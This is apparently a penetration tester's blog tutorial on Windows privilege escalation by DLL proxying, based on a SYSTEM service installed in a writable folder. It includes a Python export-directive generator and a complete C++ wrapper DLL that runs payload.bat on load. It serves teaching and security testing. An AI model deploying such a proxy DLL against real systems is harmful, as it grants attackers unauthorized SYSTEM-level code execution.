---
title: "Windows Privilege Escalation - DLL Proxying"
layout: "post"
categories: "Windows"
tags: ["Privilege Escalation", "Exploit"]
---

__DLL Hijacking__ is the first Windows privilege escalation technique I worked on as a junior pentester, with the IKEEXT service on Windows 7 (or Windows Server 2008 R2). Here, I'd like to discuss one of its variants - __DLL Proxying__ - and provide a step-by-step guide for __easily crafting a custom DLL wrapper__ in the context of a privilege escalation. 


## Scenario

I lack imagination so I will take a real-life example I encountered during a penetration test. I simply set up a Windows 10 virtual machine to replecate the vulnerable environment:

- The machine is running an up-to-date version of __Windows 10__ (x64).  
- A __third-party application__ is installed in a folder at the root of the `C:\` drive and runs as a service with `NT AUTHORITY\SYSTEM` privileges.  

The third-party service in question here was [Zabbix Agent](https://www.zabbix.com/) but it could have been something else. I really want to emphasize that __it's not a vulnerability related to a specific product__ but rather a vulnerability induced by an __insecure__ and __non-default__ installation of it. 

__By default__, the Zabbix Agent is installed in `C:\Program Files\Zabbix Agent\`, __which is a secure location__ because the inherited ACL would allow a standard user to only read and execute files from there. __However__, in this case, the sysadmins chose to install it in `C:\Zabbix Agent\`. This makes a big difference because __the ACL inherited from the partition's root is more permissive__ and would allow any user to modify its content. It seems that sysadmins were aware of this potential security issue and removed all the permissions allowing a user to modify the files. Though, __there was still a hole__ in the resulting ACL: users could still create files and directories. This left the door open for __DLL hijacking__.


## Why do we need DLL Proxying?

Here is a diagram showing the default DLL search order in Windows.

![](/assets/posts/2019-04-18-dll-proxying/dp01_dll-search-order.png)

Windows directories (e.g.: `C:\Windows\System32\`) are safe by default so this leaves us with only __two opportunities for DLL hijacking__.

1. __Case #1: at least one of the directories listed in `%PATH%` is writable__. If a program tries to load a DLL that doesn't exist (which isn't common nowadays as far as I'm aware), it will eventually look for it in this vulnerable directory. This can be easily exploited by crafting a DLL and copy it with the appropriate name.  
2. __Case #2: the directory of an application is writable__. In this case, any DLL loaded by the application can be hijacked because it's the first location used in the search process. Actually, this isn't entirely true because, if we pay close attention to the diagram, we can see that DLLs that are already loaded or _known_ DLLs have a higher priority than the application's directory, but it won't be an issue in most cases.  

Let's go back to our scenario now. We can add files in the directory of an application which is run as a service with `NT AUTHORITY\SYSTEM` privileges. The exploit seems trivial! Using _Process Monitor_, we can list the DLLs that are loaded by the executable on startup and pick one of them. Then, we create our own DLL with our payload inside `DllMain()`, name it accordingly and we wait for a reboot. Well... That's not that simple.

In the case of a missing DLL, the application works whether it exists or not. So, implementing an empty DLL with our payload inside `DllMain()` is good enough. In the case of an existing DLL on the other hand, the exploitation process requires an extra step. Indeed, an application loads a DLL because it needs to use one or more functions it exports. But, if this requirement isn't satisfied, the DLL won't be properly loaded and our payload will never be executed. To work around this issue, our DLL must export the required functions, but we don't want to actually implement them. That's where __DLL Proxying__ comes into play. 

__DLL Proxying__ is achieved through a __DLL Wrapper__. The idea is very simple and quite self-explanatory at this point. A _DLL Wrapper_ consists in redirecting all the functions to the original DLL using ___forwarders___. In a typical DLL, the [_Export Table_](https://docs.microsoft.com/en-us/windows/desktop/debug/pe-format#export-address-table) contains a list of addresses that point to the code of each exported function inside the PE file. But, there is a second option: it can also contain _Forwarders_. Instead  of referencing some code inside the DLL itself, a _Forwarder_ points to a string, which gives the name (or the ordinal number) of the exported function and the name of the DLL in which it can be found (e.g.: `FOO.DummyFunction` or `FOO.#47`). This feature is exactly what we need in order to transparently redirect all the functions to the orignal DLL as described on this diagram. 

![](/assets/posts/2019-04-18-dll-proxying/dp02_dll-proxy.png)

## How to create a DLL Wrapper?

The procedure was well described in this article: [Discord Dll Hijacking, An Old Attack On A Popular Chat Application](https://medium.com/@AndrewRollins/discord-dll-hijack-cb77a6a288cf). However, I'll try to provide my own perspective and methodology. 

The main steps are as follows:
1. List the DLLs loaded by the target application on startup and choose one to proxy.
2. Use _DLL Export Viewer_ to list the functions exported by the DLL.
3. Parse the result and generate the _export_ directives for Visual Studio.
4. Add your own code to the DLL Wrapper. 

You'll need the following:
- [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from the Sysinternals suite
- [Visual studio](https://visualstudio.microsoft.com/fr/)
- [DLL Export Viewer](https://www.nirsoft.net/utils/dll_export_viewer.html) 
- A copy of the original DLL

### 1) Choose a DLL to proxy 

It's time to fire up _Process Monitor_ and see which DLLs the target application is trying to load on startup. 

![](/assets/posts/2019-04-18-dll-proxying/dp03_procmon.png)

Here are some tips to set your filter properly in _Process Monitor_:
- _Process Name_ is `zabbix_agentd.exe`
- _Result_ is `NAME NOT FOUND`
- _Path_ ends with `.dll`

Here I picked `dbghelp.dll` but any other would do as well. We can find its location on the disk thanks to the `dir` command.

![](/assets/posts/2019-04-18-dll-proxying/dp04_dir-dbghelp.png)

/!\ On a 64-bit version of Windows, 64-bit executables are located in `C:\Windows\System32\` and 32-bit executables are located in `C:\Windows\SysWow64\`.

### 2) List the exported functions 

We'll use [DLL Export Viewer](https://www.nirsoft.net/utils/dll_export_viewer.html) to list all the functions that are exported by the DLL. Once you've opened the target DLL file (`C:\Windows\System32\dbghelp.dll` in our case), go to `View > HTML Report - All Functions`. 

![](/assets/posts/2019-04-18-dll-proxying/dp05_dll-export-viewer.png)

As the name implies, this will yield an HTML report (namely `report.html`) that we will have to parse. 

### 3) Generate the _export_ directives for the _linker_

Now that we have an __HTML report__, we can __convert it to _export_ directives__ for Visual Studio. The author of the blog I mentionned also wrote a tool in C++ to parse the report but I found it a bit overkill so I wrote my own tool in Python. I didn't test it extensively but it should work with Python 2 and 3, on both Linux and Windows I think. 

```python
"""
The report generated by DLL Exported Viewer is not properly formatted so it can't be analyzed using a parser unfortunately.
"""
from __future__ import print_function
import argparse

def main():
    parser = argparse.ArgumentParser(description="DLL Export Viewer - Report Parser")
    parser.add_argument("report", help="the HTML report generated by DLL Export Viewer")
    args = parser.parse_args()
    report = args.report

    try:
        f = open(report)
        page = f.readlines()
        f.close()
    except:
        print("[-] ERROR: open('%s')" % report)
        return

    for line in page:
        if line.startswith("<tr>"):
            cols = line.replace("<tr>", "").split("<td bgcolor=#FFFFFF nowrap>")
            function_name = cols[1]
            ordinal = cols[4].split(' ')[0]
            dll_orig = "%s_orig" % cols[5][:cols[5].rfind('.')]
            print("#pragma comment(linker,\"/export:%s=%s.%s,@%s\")" % (function_name, dll_orig, function_name, ordinal))

if __name__ == '__main__':
    main()
```

The parser should yield something like this.

![](/assets/posts/2019-04-18-dll-proxying/dp06_parser.png)

### 4) Write the DLL Wrapper

Finally, you can copy the _export_ directives into the following code snippet and add your own code to `DllMain()`. This is the code I use to execute a BATCH script. The script must be named `payload.bat` in this case and must be located in the same directory as the DLL's. 

:warning: Be very careful with the code you write inside `DllMain()`. Infinite loops for example (which may occur in case of a bindshell if a new thread isn't created), will prevent the DLL from being loaded, thus causing a Denial of Service. 

```cpp
#pragma once
// BEGIN: export directives for the linker
#pragma comment(linker,"/export:SymFreeDiaString=dbghelp_orig.SymFreeDiaString,@1111")
#pragma comment(linker,"/export:SymGetDiaSession=dbghelp_orig.SymGetDiaSession,@1112")
#pragma comment(linker,"/export:SymGetLineFromAddrEx=dbghelp_orig.SymGetLineFromAddrEx,@1113")
// ...
#pragma comment(linker,"/export:symsrv=dbghelp_orig.symsrv,@1353")
#pragma comment(linker,"/export:vc7fpo=dbghelp_orig.vc7fpo,@1354")
// END: export directives for the linker

#include <windows.h>
#include <string>
#include <atlstr.h>  

CStringW ThisDllDirPath()
{
    CStringW thisPath = L"";
    WCHAR path[MAX_PATH];
    HMODULE hm;
    if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPWSTR)&ThisDllDirPath, &hm))
    {
        GetModuleFileNameW(hm, path, sizeof(path));
        PathRemoveFileSpecW(path);
        thisPath = CStringW(path);
        if (!thisPath.IsEmpty() &&
            thisPath.GetAt(thisPath.GetLength() - 1) != '\\')
            thisPath += L"\\";
    }
    return thisPath;
}

int Exploit()
{
    // Create the command line 
    std::wstring fullpath(TEXT("cmd.exe /C \""));
    fullpath += ThisDllDirPath();
    fullpath += std::wstring(TEXT("payload.bat\""));
    TCHAR * fullpathwc = (wchar_t *)fullpath.c_str();

    // Start a new process using the command line 
    STARTUPINFO info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;
    CreateProcess(NULL, fullpathwc, NULL, NULL, TRUE, CREATE_DEFAULT_ERROR_MODE, NULL, NULL, &info, &processInfo);

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        Exploit();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Here are some configuration tips for Visual Studio:

- Create a Console Application Project in Visual Studio
- `General` - Configuration type: `Dynamic Library (.dll)`
- `C/C++ > Code generation` - Library runtime: `Multithread (/MT)`
- And of course, the architecture must match the architecture of the target executable


##  Wrapping Up

Finally, you can copy your __custom DLL__, the __orignal DLL__ and your __payload script__ to the vulnerable folder, and you're good to go! Well, in the present case we would have to wait for a reboot because we are not allowed to restart the service, but you got the point! ;)

![](/assets/posts/2019-04-18-dll-proxying/dp07_payload-files.png)

## Links & Resources 

- DLL Proxying - InfoSec Blog  
[https://kevinalmansa.github.io/application%20security/DLL-Proxying](https://kevinalmansa.github.io/application%20security/DLL-Proxying)
- Discord Dll Hijacking, An Old Attack On A Popular Chat Application  
[https://medium.com/@AndrewRollins/discord-dll-hijack-cb77a6a288cf](https://medium.com/@AndrewRollins/discord-dll-hijack-cb77a6a288cf)
- API Interception via DLL Redirection (Paper)  
[https://dl.packetstormsecurity.net/papers/win/intercept_apis_dll_redirection.pdf](https://dl.packetstormsecurity.net/papers/win/intercept_apis_dll_redirection.pdf)
- Microsoft Doc - Dynamic-Link Library Search Order  
[https://docs.microsoft.com/en-us/windows/desktop/dlls/dynamic-link-library-search-order](https://docs.microsoft.com/en-us/windows/desktop/dlls/dynamic-link-library-search-order)
- Microsoft Doc - /EXPORT (Exports a Function)  
[https://docs.microsoft.com/fr-fr/cpp/build/reference/export-exports-a-function](https://docs.microsoft.com/fr-fr/cpp/build/reference/export-exports-a-function)
- Microsoft Doc - PE Format (EXport Address Table)  
[https://docs.microsoft.com/en-us/windows/desktop/debug/pe-format#export-address-table](https://docs.microsoft.com/en-us/windows/desktop/debug/pe-format#export-address-table)

